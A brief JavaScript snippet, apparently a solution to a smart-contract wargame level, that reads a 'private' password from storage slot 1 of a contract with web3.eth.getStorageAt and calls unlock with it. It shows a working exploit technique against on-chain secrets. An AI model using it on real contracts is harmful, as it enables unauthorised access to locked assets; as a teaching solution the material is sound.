/// here we can get the state of blockcahin variable by using web3.eth.getStorageAt(contractaddress,slotnumber);
/// as locked var is at 0 slot and password var is at 1 slot;
contractAddress = "";
const pass = web3.eth.getStorageAt(contractAddress,1);
await contract.unlock(pass);